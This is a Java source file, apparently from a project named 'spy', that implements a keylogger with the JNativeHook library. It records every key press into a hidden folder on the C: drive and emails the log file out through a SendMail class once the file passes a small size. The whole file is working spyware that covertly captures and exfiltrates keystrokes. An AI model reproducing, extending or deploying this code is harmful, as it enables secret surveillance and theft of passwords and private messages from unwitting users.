package com.fabio.spy.keylogger;

import java.io.BufferedWriter;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.nio.file.Files;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import com.fabio.spy.mail.SendMail;

public class KeyLoggerCustom implements NativeKeyListener{
	private FileOutputStream ous;
	private OutputStreamWriter osw;
	private BufferedWriter bw;
	private static final String PATH="C:/";
	private static final String FILE_NAME="012345.txt";
	
	private SendMail sendMail;
	private static final Long maxSize=45L;
	
	public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
		
		
	}

	public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
		String text=NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
		File file=new File(PATH+"logger");
		Long size=0L;
		if(!file.exists()) {
			file.mkdir();
			try {
				Process process=Runtime.getRuntime().exec("attrib +H "+file.getPath());
				process.waitFor();
				
			} catch (Throwable e) {
				e.printStackTrace();
				System.exit(-1);
			}
		}
		try {
			ous=new FileOutputStream(PATH+"logger/"+FILE_NAME,true);
			osw=new OutputStreamWriter(ous);
			bw=new BufferedWriter(osw);
			try {
				bw.write(text);
				bw.flush();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				System.exit(-1);
			}
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			System.exit(-1);
		} finally {
			try {
				bw.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				System.exit(-1);
			}
			try {
				osw.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				System.exit(-1);
			}
			boolean invia=inviaEmail();
			if(invia) {
				sendMail=new SendMail();
				try {
					sendMail.sendMailConAttachment(new File(PATH+"logger/"+FILE_NAME));
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		
	}

	public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
		
		
	}
	
	
	private boolean inviaEmail() {
		File file=new File(PATH+"logger/"+FILE_NAME);
		if(file.exists()) {
			if(file.length()<maxSize) {
				return false;
			}else {
				return true;
			}
		}else {
			return false;
		}
		
	}
}
